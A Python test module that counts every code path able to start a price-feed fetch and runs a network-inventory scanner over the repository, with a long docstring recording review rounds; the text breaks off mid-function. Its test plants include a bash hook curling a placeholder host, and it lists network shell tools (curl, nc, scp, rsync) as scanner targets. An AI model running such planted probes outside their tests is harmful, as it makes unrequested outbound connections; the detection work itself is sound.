#!/usr/bin/env python3
"""Every place a price fetch can start is counted, and every road to it (the review of PR 878, 2026-09-21).

The claim the off switch rests on is that _refresh_remote_prices is the ONE place a price fetch can start: the switch
(ROMP_PRICE_FEED=off, _price_feed_off) is its first statement, so nothing else in the kernel reaches the feed's host
(docs/reference.md's price feed subsection and the ledger entry say so). Until this module the claim stood in
docstrings alone: a second urlopen of PRICE_FEED_URL in another function, or a second refresh=True caller of
_model_prices (a boot warm-up, a route handler), left every price feed test green. This is the census that keeps it
true, in the repo's classify-or-red shape: every site found is in the table below with its reason, or the test fails
naming the site by file, enclosing function and line and the two ways to resolve it; and a classified site that no
longer exists fails too, so the table cannot go stale.

Counted, by ast over kernel/kernel.py: (1) every call whose arguments (positional or keyword, at any depth) read the
name PRICE_FEED_URL, and every other read of that name, so an alias (`url = PRICE_FEED_URL`) is a site too (the URL is
read once, in the worker's urlopen); (2) every call to _refresh_remote_prices (the one caller is _model_prices); (3)
every call to _model_prices, partitioned by its `refresh` argument: the callers that let the refresh run (no
`refresh` argument, or one that is not the constant False) are the cost view's build alone, and the refresh=False
callers are the guard's road and the status's own merge, which never enter the refresh (T350); (4) since the sixth round
(fresh-1), every load of the name _token_analytics, the build of the Token usage view's payload that lets the refresh run
(called, aliased or passed), classified per function with the number of loads it holds: the /analytics route and the build's
own one rebuild, so a load anywhere else (a boot caller, an alias) is red by name and a second load in either function as a
moved count. The enclosing function is the path of nested defs and classes (the worker is `_refresh_remote_prices.work`); a
call at module level is `<module>`.

Text only: kernel/kernel.py is read as a file and parsed once per process (tests/parse_cache.py's source_and_tree: the
parse this half, the switch case and the served pass below share, and in a serial cell the thread-stop census's parse of
the same file is the same object); nothing loads romp code but tests/romp_load.py, imported above the preamble as every test
module imports it, which execs kernel/loadsource.py (the suite's file-path importer) and gives a direct run of this module the
tests package's private temp root. The state root the preamble at the head mints is the state ratchet's floor for the in-process
load of the census script (tests/test_state_isolation_order.py reads every importlib
load in a test module as a load of romp code), an empty directory under the run's temp root. tests/test_price_feed_off.py
executes the switch at the one site this module counts (OffSwitch, GuardRoad); tests/test_stage_marks.py's census keys on
the worker's inner def name.

The second half of this module (round 2 of the review, 2026-09-21) runs scripts/network-inventory.py, the census of
every outbound primitive over the runtime trees that SECURITY.md's Network access section and the ledger entry's road
table are derived from. Until this round nothing ran it: its guarantee held only when a person typed the command, its
only gate was an unclassified site (a scan that lost a third of its sites exited 0), its walk was flat, it filed a
shell, node or perl child and every browser fetch as local by spelling, and a second site inside a function that
already had a row folded into that row. The script now exits 1 on a missing root, a file that does not parse, an
unknown import, no sites, an unclassified site, a stale row, a road with no table entry, and any figure that differs
from the committed counts (scripts/network-inventory-expected.json); it walks its roots recursively, classes a program
whose far end its argv does not derive as external-program (never set aside), places a browser fetch by its URL, names
the four classes it cannot see in its --table output, and prints the ledger's table from the sites. The classes below
run it in this process (the fifth round, 2026-09-23; a child interpreter per run before it): the script imported as a
module (script_module) and its main called over a root with stdout and stderr captured and the collector held off for
the run (inventory, _collector_off), over the tree once per process (tree_run: one derivation behind
tests/parse_cache.py's derived, the script's scan, figures, problems, render_sites and render_table in main's order,
serving the listing road and the --table road from one scan), over a copy of the scanned scope with one mutation at a
time (each red the round reproduced or named, now a pin), or with a class's row-less mutations planted together and read
from one run (_SharedRun, whose docstring says why that loses nothing), over two tiny roots (no sites; a missing root) on
both roads, and the tree's --table, composed in process (tree_run), against the block the ledger entry carries between its
two marker lines. Two cases run the file as the command line runs it, in children (_command_line; since the fifth round,
when the review found the documented command held by no real run): over each tiny root, exiting 1 with the in-process run's
output byte for byte, and since the sixth round with --table before the root too, exiting 1 with the table render_table
writes from a scan made apart from main on stdout and the problem lines on stderr; and over a copy whose kernel/kernel.py
carries exactly the served pass's plants (written by _served_text, the text the pass parses), exiting 1 with the pass's
output byte for byte, so the entry's exit code, its --table road, the tree derivation and the served splice are each held
against a real run. A run of the file thus covers the listing road over a full copy of the scanned scope and both roads
over the tiny roots; no run of the file prints the full tree's table. The script loads no romp code and
this module loads none beyond tests/romp_load.py's kernel/loadsource.py; the copy lives under the run's temp root (tests/__init__.py's hook removes it, and
tearDownModule does too).

The third round of the review (2026-09-22) found the completeness claim holding for the Python half alone: the shell and
browser scans were closed tool lists with no interpreter arm and no import gate, a program site in the browser or editor
code carried no class whatever its argv, the one npx in the tree was no site, and the Python import gate did not reach
importlib.import_module. The classes from TheShellSideHasAnInterpreterArm on pin the widening by execution over the scope
copy: a shell interpreter text (python3 -c, the heredoc shape, node -e) is a site keyed file plus tool in the
external-program class and needs a row; npx, scp, rsync, sftp and nc are tools; the child_process family is a site only
through its binding (a bare exec( with none is RegExp exec) and is classed by its argv, so the four live program sites
carry the class and leave the local count; net, tls, XMLHttpRequest and sendBeacon are sites; a package the browser and
editor code imports outside KNOWN_JS_IMPORTS fails the run, as does a module named to import_module outside KNOWN_IMPORTS
or one the scan cannot resolve; a socket's sendto and the event loop's connections are sites; the committed counts carry
the program head per Python command site, so a same-count swap of a local tool for curl inside a rowed function is a
COUNTS line naming the key and the head; a socket primitive on a receiver the scan cannot resolve is stated as a named
class and held to the behaviour by a planted call the run does not see; and the git boundary is pinned by two plants (a
row-less git checkout is UNCLASSIFIED with no class tag, a bare git with a runtime subcommand carries it). Each case is
green at the tree and red over a copy of the script with its arm removed (the round's record names the mutation).

Before the fourth round (2026-09-22), on the reviewer's ruling over the derivation of the editor extension's
`vscode.env.openExternal`, the census gained the clicked-link road, a link you click on either host: the extension's one call
is a site through the JS entry `openExternal`, and `window.open` is a JS tool rather than a DOM load, so each of its four lines
is a site with a row (three on the road; the file preview's own-tab open of the kernel's own file URL local). TheClickedLinkRoadIsPinned
holds the five sites to their rows by execution and the road's residual sentence to its three homes; each tree case is red over a
scratch copy of the tree with its arm taken out of the script (the round's record names the mutation).

The fourth round of the review (2026-09-23, the landing round again) found four holes in the census's completeness claim and
one road with no row. The classes below pin the closing of each by execution over the scope copy, and the mutations are
numbered on from the third round's record (M19 to M25): TheEchoRuleScansTheLiveRemainder, a shell run member, appends the
echo-led lines ECHO_TEXT holds to bin/romp: the pipe form and the double-quoted substitution form are curl sites, a python3 -c
substitution is an interpreter site on its row and a node -e one is UNCLASSIFIED, while three copies of the tree's printed
remedies (a tool inside quotes) list no site, and the tree's four remedy lines, located by content, have no site line (M19:
the head's one-line skip restored in a scratch copy of the script, none of the live lines listed).
TheConnectionFamilyIsReadThroughItsBindings, a browser run member, plants ui/webview/probe-bindings.ts (an inline require's
get, a renamed destructured request, a ws default import's constructor) and probe-dedupe.ts (a namespace-bound http.get the
literal list and the arm both match, listed once), and holds the timeline view's two require('http').request calls to their
local-kernel row by content (M20: the arm's loop emptied, the three lines unlisted and the row stale; M26: the arm's once-per-line
guard dropped, the doubly matched call two sites and the tree's namespace-bound keys doubled). TheServedPagesAreScanned,
since the fifth round an in-process pass and not a run (served_pass: the plants applied to kernel/kernel.py's text in
memory, that text parsed once, the script's Scan over it for the routes and served_texts over them, spliced into the tree's
one result in place of kernel.py's own contributions, then the script's figures, problems and render_sites; its import
plant would otherwise join the credentials run's IMPORT set), plants in kernel/kernel.py a third-party
fetch, a socket, an opener, a brace-led alert and an import statement in _TIMELINE_BOOT, a sendBeacon in the settings page's
template, three routes before the /chat branch (a page read from a file the walk does not scan, an f-string page, a page whose
fetch URL is a Python format slot) and a method serving text/html from a parameter, and holds the shim's and the shell's
sockets, the boot's dead opener, the worker's clients.openWindow, the four computed fetches and the four pane stylesheets to
their listing by content (M21: the served pass replaced by pass, the plants unlisted and the three served rows stale).
TheChatMediaRoadIsRowed holds the chat-media row's two sites (md's and userMd's mdImgPostPass lines) and its five cells by
content (M22: the T row dropped and the JS pattern's lookbehind removed in one scratch copy, the two lines UNCLASSIFIED, the
road named with no site and preview.ts's definition line a site). TheGitHubButtonsHrefWriteIsListedByContent holds the file
viewer's href write to its dom-load line by content (M23: the write deleted, the class count moves; M24: a window.open appended
to the line, the clicked-link road's count and the file's key move). TheWalkIsRecursiveOverTheDeclaredScope gains
hooks/probe.bash, a dotted hook outside the five extensions read for its shebang, and TheKindOfReadsADottedHooksShebang holds
it (M25: kind_of's early return for a dotted name restored, the hook silent). TheClickedLinkRoadIsPinned's residual cases read
the sentence's third anchor (a message's own same-origin download anchor) and hold the module's constant equal to the
script's by execution; the window.open key list gains the timeline boot's dead opener in the served text. The docstring
sentences the round added (the echo rule, the served pages, the refused whole-file scan, the narrowed import gate, the
keyed-by-tool residual, the named class of stylesheet url() loads and same-origin navigations) are held in
TheResidualClassIsStatedAndHeld as DISCLOSURE is. Every case is green at the tree; every plant and tree case is red over the
archive of the round's reviewed head with this module copied in (the shell, browser and served plants silent there at exit 0;
the chat-media, timeline and served rows absent; the old residual text; the docstring without the round's sentences), and every
mutation case (M19 to M26) is a case of its own that removes or restores an arm the round added and asserts the shape that
leaves, so its evidence is the mutation at the tree; over the archive such a case stops at its anchor, since the arm's own line is
not there, and the plant case beside it carries the archive red.

The fifth round (2026-09-23), on the fork reviewer's ruling over the serial cell's cost, changed how the runs happen and not
what they assert: every case keeps its name, its property and its M-number. What runs, per run of this module: one tree
derivation (the listing and the table from one scan), one served pass (about 1 s, under half a scan), five shared runs (walk,
shell, browser, credentials, clean) and twenty-one runs of their own, each an in-process main over the copy, plus the two
tiny roots: 27 full scans and the pass where 34 child processes each ran a full scan before, and each scan about a third
cheaper with the collector held off (2.4 s against 3.7 s on 3.10 on the box that measured it). The joins: the default-rule
programs block (AnExternalProgramIsNeverLocalByDefault) in the credentials run; the unknown-import and socket blocks
(ThePrimitiveListIsKeptHonest) and the literal-URL function (ASecondSiteInsideARowedFunctionIsRed) in the walk run; the
copy-clean control and the residual class's plant in the clean run. Every joined case asserts its own file's lines or its
own row key; every case that asserts a figure of the whole run (a class count, an empty UNCLASSIFIED set, the run's IMPORT
set, a clean summary) keeps its run, as does every mutation of the script and of the whole listing. The round's record
carries the before and after figures and every touched pin's red.
"""
import ast
import bisect
import contextlib
import difflib
import gc
import importlib.util
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from romp_load import load_source   # noqa: F401  a direct run's floor (tests/romp_load.py), above the preamble as in every module

# Hermetic state BEFORE the in-process load of the census script (script_module, below): tests/test_state_isolation_order.py
# reads every importlib load in a test module as a load of romp code and asks for this floor above it. The script is
# standard-library code and resolves no state root, and nothing here loads romp code but the suite's file-path importer
# (tests/romp_load.py, imported above as every test module imports it, which execs kernel/loadsource.py); the floor is the
# ratchet's price for the load, an empty directory under the run's temp root, which a direct run of this module has too
# since the import above brings in the tests package.
os.environ["XDG_STATE_HOME"] = tempfile.mkdtemp()
os.environ.pop("ROMP_STATE_DIR", None)   # a live kernel's export outranks the XDG floor

HERE = os.path.dirname(os.path.realpath(__file__))
ROOT = os.path.dirname(HERE)
if __package__:                                   # under pytest tests/ is a package: THE SAME parse_cache module object every
    from . import parse_cache as PC               # census in the process shares (one parse per file, one derivation per key)
else:                                             # a direct run of this file: the module by name from its own directory
    if HERE not in sys.path:
        sys.path.insert(0, HERE)
    import parse_cache as PC
KERNEL_PATH = os.path.join("kernel", "kernel.py")

# The table. A site is classified here, with its reason, only once it cannot start an ungated fetch: a fetch that
# starts anywhere but _refresh_remote_prices must check _price_feed_off itself, or route through _model_prices.
URL_SITES = {"_refresh_remote_prices.work": "the worker's urlopen, inside the one function the switch gates"}
REFRESH_CALLERS = {"_model_prices": "the merge's refresh road (refresh=True), the cost view's"}
REFRESH_TRUE_CALLERS = {"_token_analytics": "the /analytics build, the one road that lets a fetch start"}
# Who builds the Token usage view's payload, the build that lets a fetch start (fresh-1 of the sixth round): every load of the name
# _token_analytics in kernel/kernel.py's tree (a call, an alias, a pass as an argument), per enclosing function with the number of
# loads it holds at the head and its reason. A load anywhere else, in another function or at module level (a boot caller,
# `f = _token_analytics`), is red by name, and a second load in a classified function as a moved count; a reference that is no load
# of the name (an attribute, a string) is not read.
ANALYTICS_REFS = {
    "Handler.do_GET": (1, "the /analytics route: a build of the Token usage view's payload, on an open of the view or a period picked in it"),
    "_token_analytics": (1, "its own one rebuild under _ANALYTICS_REPRICING, when the table moved while the payload was priced"),
}
REFRESH_FALSE_CALLERS = {
    "_spend_window_usd": "the spend guard's window sum on the pusher's path: never a fetch (T350)",
    "_spend_guard_tick": "the spend guard's tick on the pusher's path: never a fetch (T350)",
    "_price_feed_status": "the status's own merge under _price_feed_lock, the count of overrides: never a fetch (T350)",
}
RESOLVE = ("either gate it behind _price_feed_off (the first statement of _refresh_remote_prices is the shape) and add it "
           "to the table in tests/test_price_feed_census.py with its reason, or route it through _model_prices")
RESOLVE_ANALYTICS = ("a build of the Token usage view's payload anywhere but its route and its one rebuild can start the price fetch "
                     "from there (at boot, on a timer): drop the reference, or add its function to ANALYTICS_REFS in "
                     "tests/test_price_feed_census.py with its count and its reason, and state the new trigger where the table's "
                     "price-feed row, SECURITY.md and docs/reference.md state it")


class _Census(ast.NodeVisitor):
    """Every call in a module with the path of the function it sits in, every read of PRICE_FEED_URL and every load of the name
    _token_analytics."""

    def __init__(self):
        self.path = []
        self.calls = []        # (path, Call)
        self.url_reads = []    # (path, line)
        self.builds = []       # (path, line): each load of the name _token_analytics

    def _scope(self, node):
        self.path.append(node.name)
        self.generic_visit(node)
        self.path.pop()

    visit_FunctionDef = visit_AsyncFunctionDef = visit_ClassDef = _scope

    def visit_Call(self, node):
        self.calls.append((".".join(self.path) or "<module>", node))
        self.generic_visit(node)

    def visit_Name(self, node):
        if node.id == "PRICE_FEED_URL" and isinstance(node.ctx, ast.Load):
            self.url_reads.append((".".join(self.path) or "<module>", node.lineno))
        if node.id == "_token_analytics" and isinstance(node.ctx, ast.Load):
            self.builds.append((".".join(self.path) or "<module>", node.lineno))


def _callee(call):
    f = call.func
    return f.id if isinstance(f, ast.Name) else f.attr if isinstance(f, ast.Attribute) else None


def _reads_url(call):
    exprs = list(call.args) + [k.value for k in call.keywords]
    return any(isinstance(n, ast.Name) and n.id == "PRICE_FEED_URL" for e in exprs for n in ast.walk(e))


def _refresh_is_false(call):
    """True only for the constant False, by keyword or as the second positional; anything else lets the refresh run."""
    for k in call.keywords:
        if k.arg == "refresh":
            return isinstance(k.value, ast.Constant) and k.value.value is False
    if len(call.args) >= 2:
        return isinstance(call.args[1], ast.Constant) and call.args[1].value is False
    return False


def census(src, tree=None):
    """{"url": {path: [lines]}, "url_reads": {path: [lines]}, "refresh": {...}, "true": {...}, "false": {...}, "builds": {...}};
    `tree` is the source's parsed tree when the caller holds one (the kernel's, from tests/parse_cache.py), else the source is
    parsed here."""
    c = _Census()
    c.visit(tree if tree is not None else ast.parse(src))
    out = {"url": {}, "url_reads": {}, "refresh": {}, "true": {}, "false": {}, "builds": {}}
    for path, line in c.url_reads:
        out["url_reads"].setdefault(path, []).append(line)
    for path, line in c.builds:
        out["builds"].setdefault(path, []).append(line)
    for path, call in c.calls:
        name = _callee(call)
        if _reads_url(call):
            out["url"].setdefault(path, []).append(call.lineno)
        if name == "_refresh_remote_prices":
            out["refresh"].setdefault(path, []).append(call.lineno)
        elif name == "_model_prices":
            out["false" if _refresh_is_false(call) else "true"].setdefault(path, []).append(call.lineno)
    return out


# kernel/kernel.py's text and tree, parsed once per process (tests/parse_cache.py: the module's first half, the switch case and
# the served pass read this one; in a serial cell the thread-stop census's parse of the same file is the same object)
KERNEL, KERNEL_TREE = PC.source_and_tree(os.path.join(ROOT, KERNEL_PATH), KERNEL_PATH)
CENSUS = census(KERNEL, KERNEL_TREE)


class _Pins(unittest.TestCase):
    def assertClassified(self, found, table, what, resolve):
        """Every site found is in the table (else: the site by file, function and line, and how to resolve it), and every
        table entry is found (else: the stale row)."""
        for path in sorted(set(found) - set(table)):
            self.fail("%s:%s %s %s and is not in the classified set: %s" % (
                KERNEL_PATH, ",".join(str(n) for n in found[path]), path, what, resolve))
        for path in sorted(set(table) - set(found)):
            self.fail("the census table names %s, which no longer %s: drop it from the table (a classified site that is "
                      "gone is a stale row, never a pass)" % (path, what))

    def assertBuildsClassified(self, found):
        """Every load of _token_analytics is in a function ANALYTICS_REFS classifies (else: red by file, function and line), every
        classified function still loads it, and each holds the number of loads the table gives it (else: a moved count, naming the
        function and its lines), so a second reference inside a classified function is not absorbed into the one classified there."""
        self.assertClassified(found, ANALYTICS_REFS, "loads _token_analytics", RESOLVE_ANALYTICS)
        for path, (n, why) in sorted(ANALYTICS_REFS.items()):
            lines = found.get(path, [])
            self.assertEqual(len(lines), n, "%s:%s %s loads _token_analytics %d times and ANALYTICS_REFS classifies %d (%s): each load "
                             "is a reference of its own: %s" % (KERNEL_PATH, ",".join(str(x) for x in lines), path, len(lines), n, why,
                                                               RESOLVE_ANALYTICS))


class TheFeedHasOneFetchSite(_Pins):
    def test_the_census_finds_its_anchors(self):
        """An empty census is a moved anchor (the functions renamed, the constant renamed), never a pass."""
        self.assertTrue(CENSUS["url"], "kernel/kernel.py calls something with PRICE_FEED_URL among its arguments")
        self.assertTrue(CENSUS["refresh"], "kernel/kernel.py calls _refresh_remote_prices")
        self.assertTrue(CENSUS["true"] and CENSUS["false"], "kernel/kernel.py calls _model_prices with and without refresh=False")
        self.assertTrue(CENSUS["builds"], "kernel/kernel.py loads the name _token_analytics")

    def test_the_url_is_read_at_the_workers_urlopen_alone(self):
        self.assertClassified(CENSUS["url"], URL_SITES, "passes PRICE_FEED_URL to a call", RESOLVE)
        self.assertClassified(CENSUS["url_reads"], URL_SITES, "reads PRICE_FEED_URL",
                              "a read outside the worker's urlopen is a second road to the host, or an alias for one: " + RESOLVE)
        self.assertEqual(sum(len(v) for v in CENSUS["url_reads"].values()), 1,
                         "the constant is read exactly once outside its own assignment: %r" % CENSUS["url_reads"])

    def test_the_refresh_is_entered_from_the_merge_alone(self):
        self.assertClassified(CENSUS["refresh"], REFRESH_CALLERS, "calls _refresh_remote_prices",
                              "a caller besides _model_prices is a road to a fetch that the T350 rule (refresh=False never "
                              "enters the refresh) does not cover: route it through _model_prices, or add it here with its reason")

    def test_the_merge_lets_a_fetch_start_from_the_cost_view_alone(self):
        self.assertClassified(CENSUS["true"], REFRESH_TRUE_CALLERS, "calls _model_prices letting the refresh run",
                              "a second refresh=True caller is a second road to the feed's host (a boot warm-up, a route handler): "
                              "pass refresh=False if it must never fetch, or add it here with its reason and the switch it obeys")
        self.assertClassified(CENSUS["false"], REFRESH_FALSE_CALLERS, "calls _model_prices with refresh=False",
                              "a new refresh=False caller never fetches (T350); add it to the table with its reason")

    def test_the_build_is_reached_from_its_route_and_its_one_rebuild_alone(self):
        """fresh-1 of the sixth round: the trigger is a build of the Token usage view's payload (/analytics), so the roads to a
        fetch are the roads to the build. Every load of the name _token_analytics in the kernel's tree, called, aliased or passed,
        is classified per function with its count (ANALYTICS_REFS: the route in do_GET and the build's own one rebuild), read from
        the tree this module already holds (no parse, no scan); a boot caller or an alias passed every price feed check before."""
        self.assertBuildsClassified(CENSUS["builds"])

    def test_the_switch_is_the_first_statement_of_the_one_fetch_site(self):
        """Read as text here so the census and the gate are one module (tests/test_price_feed_off.py executes it)."""
        fn = next(n for n in KERNEL_TREE.body if isinstance(n, ast.FunctionDef) and n.name == "_refresh_remote_prices")
        body = fn.body[1:] if isinstance(fn.body[0], ast.Expr) and isinstance(fn.body[0].value, ast.Constant) else fn.body
        self.assertIsInstance(body[0], ast.If)
        self.assertEqual(ast.unparse(body[0].test), "_price_feed_off()", "the switch gates the one fetch site before anything else")


class TheCensusIsLive(unittest.TestCase):
    """The extractor on a small module of its own: a second fetch site, a second refresh caller and an alias are found,
    a boot caller, an alias and a second load of the build (_token_analytics) are found and red, and a classified site that
    is gone is found missing. The same functions run over the real kernel above."""

    SMALL = '''
PRICE_FEED_URL = "https://TESTHOST/prices.json"

def _refresh_remote_prices(now):
    def work():
        with urllib.request.urlopen(PRICE_FEED_URL, timeout=4) as r:
            return r
    return work

def _model_prices(now=None, refresh=True):
    if refresh:
        _refresh_remote_prices(now)
    return {}

def _spend_window_usd(now):
    return _model_prices(int(now), refresh=False)

def _spend_guard_tick(now):
    return _model_prices(int(now), refresh=False)

def _price_feed_status(now):
    return _model_prices(now, refresh=False)

def _token_analytics(now, window):
    if window < 0:
        return _token_analytics(now, -window)
    return _model_prices(now)

class Handler:
    def do_GET(self):
        return self._send(200, _token_analytics(0, 86400))
'''

    def test_the_small_module_matches_the_table(self):
        c = census(self.SMALL)
        self.assertEqual(set(c["url"]), set(URL_SITES))
        self.assertEqual(set(c["refresh"]), set(REFRESH_CALLERS))
        self.assertEqual(set(c["true"]), set(REFRESH_TRUE_CALLERS))
        self.assertEqual(set(c["false"]), set(REFRESH_FALSE_CALLERS))
        self.assertEqual({p: len(v) for p, v in c["builds"].items()}, {p: n for p, (n, _) in ANALYTICS_REFS.items()})

    def test_a_second_urlopen_of_the_url_is_found(self):
        c = census(self.SMALL + "\ndef _warm_prices():\n    return urllib.request.urlopen(PRICE_FEED_URL, timeout=4)\n")
        self.assertEqual(set(c["url"]) - set(URL_SITES), {"_warm_prices"})
        self.assertEqual(sum(len(v) for v in c["url_reads"].values()), 2)

    def test_an_alias_of_the_url_is_found(self):
        c = census(self.SMALL + "\ndef _warm_prices():\n    url = PRICE_FEED_URL\n    return urllib.request.urlopen(url)\n")
        self.assertEqual(set(c["url"]), set(URL_SITES), "the call reads the alias, not the name")
        self.assertEqual(set(c["url_reads"]) - set(URL_SITES), {"_warm_prices"}, "and the read of the name finds it")

    def test_a_second_refresh_true_caller_is_found(self):
        c = census(self.SMALL + "\ndef _boot_warm(now):\n    return _model_prices(now)\n")
        self.assertEqual(set(c["true"]) - set(REFRESH_TRUE_CALLERS), {"_boot_warm"})
        c = census(self.SMALL + "\ndef _boot_warm(now):\n    return _model_prices(now, refresh=bool(now))\n")
        self.assertIn("_boot_warm", c["true"], "a refresh argument that is not the constant False lets the refresh run")
        c = census(self.SMALL + "\ndef _boot_warm(now):\n    return _model_prices(now, False)\n")
        self.assertIn("_boot_warm", c["false"], "the constant False as the second positional is the guard's road")

    def test_a_second_caller_of_the_refresh_is_found(self):
        c = census(self.SMALL + "\ndef _boot_warm(now):\n    _refresh_remote_prices(now)\n")
        self.assertEqual(set(c["refresh"]) - set(REFRESH_CALLERS), {"_boot_warm"})

    def test_a_boot_caller_an_alias_and_a_second_load_of_the_build_are_found(self):
        pins = _Pins("assertBuildsClassified")
        pins.assertBuildsClassified(census(self.SMALL)["builds"])
        for plant, path, what in (("\ndef main():\n    _token_analytics(int(time.time()), 86400)\n", "main", "a boot caller"),
                                  ("\nf = _token_analytics\n", "<module>", "an alias"),
                                  ("\ndef _boot_warm():\n    threading.Thread(target=_token_analytics, args=(0, 1)).start()\n",
                                   "_boot_warm", "a pass as an argument")):
            c = census(self.SMALL + plant)
            self.assertEqual(set(c["builds"]) - set(ANALYTICS_REFS), {path}, what)
            with self.assertRaises(AssertionError) as cm:
                pins.assertBuildsClassified(c["builds"])
            self.assertIn(" %s loads _token_analytics and is not in the classified set" % path, str(cm.exception), what)
        second = self.SMALL.replace("        return self._send(200, _token_analytics(0, 86400))\n",
                                    "        g = _token_analytics\n        return self._send(200, _token_analytics(0, 86400))\n")
        self.assertNotEqual(second, self.SMALL)
        c = census(second)
        self.assertEqual(len(c["builds"]["Handler.do_GET"]), 2, "a second load inside a classified function")
        with self.assertRaises(AssertionError) as cm:
            pins.assertBuildsClassified(c["builds"])
        self.assertIn("Handler.do_GET loads _token_analytics 2 times and ANALYTICS_REFS classifies 1", str(cm.exception))

    def test_a_classified_site_that_is_gone_is_found_missing(self):
        gone = self.SMALL.replace("def _spend_guard_tick(now):\n    return _model_prices(int(now), refresh=False)\n", "")
        self.assertNotEqual(gone, self.SMALL)
        c = census(gone)
        self.assertEqual(set(REFRESH_FALSE_CALLERS) - set(c["false"]), {"_spend_guard_tick"})
        with self.assertRaises(AssertionError) as cm:
            _Pins("assertClassified").assertClassified(c["false"], REFRESH_FALSE_CALLERS, "calls _model_prices with refresh=False", "")
        self.assertIn("stale row", str(cm.exception))


# ---- the census script, run from the suite ------------------------------------------------------------------------------

INVENTORY = os.path.join("scripts", "network-inventory.py")
EXPECTED = os.path.join("scripts", "network-inventory-expected.json")
SCOPE_DIRS = ("kernel", "cli", "postal", "bin", "hooks", "ui", "vscode-extension/src")   # the script's declared roots
SCOPE_FILES = ("bootstrap.sh", "install.sh", "vscode-extension/install.sh", "tools/file-comments-host.mjs", INVENTORY, EXPECTED)
LEDGER = os.path.join("upstream", "2026-09-20-price-feed-off.md")
BEGIN, END = "<!-- network-inventory: table begin -->", "<!-- network-inventory: table end -->"
SUMMARY = re.compile(r"^--- (?P<sites>\d+) sites, (?P<roads>\d+) roads \((?P<local_roads>\d+) of them local\), (?P<local_sites>\d+) local sites "
                     r"set aside, (?P<unclassified>\d+) unclassified; (?P<external>\d+) external-program, (?P<runtime>\d+) runtime-program, "
                     r"(?P<computed>\d+) browser-computed-url, (?P<dom>\d+) browser-dom-loads; (?P<files>\d+) files scanned, (?P<skipped>\d+) skipped by kind$", re.M)
FEED_LITERAL = "https://TESTHOST/prices.json"   # a synthetic URL: the bypass the census must catch spells the host as a literal
SITE_LINE = re.compile(r"^\S+:\d+  ")
# a dotted hook outside the five extensions, read for its shebang (the fourth round, fresh-2): its curl is a site at its line 2
BASH_HOOK_TEXT = "#!/usr/bin/env bash\ncurl https://example.invalid/probe\n"


@contextlib.contextmanager
def _collector_off():
    """The collector held off for one in-process run of the script, the rule tests/parse_cache.py's derived applies to a
    build: disabled when found enabled and handed back on in a finally, never touched when found off (the state read inside
    the try, so an interrupt between the read and the finally cannot leave it off). A run builds kernel.py's tree and drops
    it before returning (an ast node holds no parent, so no cycle survives), so nothing is left for a collection after the
    run and nothing is frozen here; with the collector on, its walks of the tree under construction were a third of a run
    on 3.10 (3.7 s against 2.4 s on the box that measured the fifth round, 2026-09-23)."""
    collecting = False
    try:
        collecting = gc.isenabled()
        if collecting:
            gc.disable()
        yield
    finally:
        if collecting:
            gc.enable()


_SCRIPTS = {}   # (realpath, (size, mtime_ns, inode, ctime_ns)) -> the module object: the tree's once, a copy's once per text on disk


def script_module(root):
    """<root>/scripts/network-inventory.py imported as a module object in this process, keyed on the file's realpath and its
    (size, mtime_ns, inode, ctime_ns) as tests/parse_cache.py keys a parse: the tree's script once per process (the tree
    derivation, the served pass and the binding read share it), a copy's once per text on disk, since a case mutates the
    copy's script (M19 to M26, the stale row, the roads set, the openExternal entry, the rowed interpreter text) and its
    cleanup restores it, and each text is its own module. The name is private and never enters sys.modules, so the script's
    `if __name__ == "__main__"` road does not run here; the two child runs of the file (_command_line) run it. The module
    carries the script's constants (T, ROADS, CLASS_ROWS, CLICK_RESIDUAL, PAINT_LIST, PAINT_CLAUSE, SERVED_ALLOW, EXPECTED)
    and its functions (main, scan, figures, problems, render_sites, render_table, Scan, served_texts, Result, Site), the
    surface the runs, the served pass, the stale-entry cases and the binding reads call (this module's and
    tests/test_security_price_feed.py's, which read CLASS_ROWS, CLICK_RESIDUAL, ROADS and the paint constants here and in no
    child). The fifth round (2026-09-23), on the reviewer's cost ruling; a child interpreter ran the file before it."""
    real = os.path.realpath(os.path.join(root, INVENTORY))
    st = os.stat(real)
    key = (real, (st.st_size, st.st_mtime_ns, st.st_ino, st.st_ctime_ns))
    mod = _SCRIPTS.get(key)
    if mod is None:
        spec = importlib.util.spec_from_file_location("network_inventory_%d" % len(_SCRIPTS), real)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        _SCRIPTS[key] = mod
    return mod


def inventory(root, *flags):
    """Run <root>/scripts/network-inventory.py over root in this process: the script's own main (script_module), the flags
    and the root as the command line hands them, stdout and stderr captured, the collector held off for the run
    (_collector_off): (exit code, stdout, stderr), the exit code being main's return, which the command line passes to
    sys.exit (that entry is held by the two child runs of the file, _command_line). One run is one full scan of the root's
    declared scope, about 2.4 s on 3.10 with the collector off."""
    mod = script_module(root)
    out, err = io.StringIO(), io.StringIO()
    with _collector_off(), contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        rc = mod.main(list(flags) + [root])
    return rc, out.getvalue(), err.getvalue()


def _command_line(root, timeout, *flags):
    """(exit code, stdout bytes, stderr text) of `python3 <root>/scripts/network-inventory.py [--table] <root>` in a child, the
    flags before the root: the file run as SECURITY.md's Network access section and the ledger entry document the command, so
    its `if __name__ == "__main__"` entry runs, which no in-process run reaches (script_module loads the file under a private
    name). Two cases of this module make it (the fifth round of the review, 2026-09-23, found that the cost cut left the
    documented command held by no real run, and the sixth found the same of its --table road), and what a run of the file
    covers is theirs: the listing road over a full copy of the scanned scope (the served class's command-line case, one full
    scan) and both roads, the listing and --table, over each of the two tiny roots (the tiny roots' case, about 0.06 s a child).
    No run of the file prints the full tree's table: tree_run composes it in process. The child inherits this process's
    environment, the state floor above included, and reads no state."""
    p = subprocess.run([sys.executable, os.path.join(root, INVENTORY)] + list(flags) + [root], capture_output=True, timeout=timeout)
    return p.returncode, p.stdout, p.stderr.decode("utf-8", "replace")


class _Run(object):
    """One run's pieces as the script's main composes them (read for the order): the Result scan returned, its figures, the
    committed counts read from <root>/scripts/network-inventory-expected.json (None when the file is absent), the problem
    lines, the listing render_sites writes and the table render_table writes."""
    __slots__ = ("res", "fig", "expected", "problems", "listing", "table")

    def __init__(self, res, fig, expected, problems, listing, table):
        self.res, self.fig, self.expected, self.problems, self.listing, self.table = res, fig, expected, problems, listing, table


def _run_of(mod, root, res):
    """The pieces main composes from one Result (_Run), in main's order: figures, the committed counts, problems, and both
    renders, so one scan serves the listing road and the --table road."""
    fig = mod.figures(res)
    path, expected = os.path.join(root, mod.EXPECTED), None
    if os.path.isfile(path):
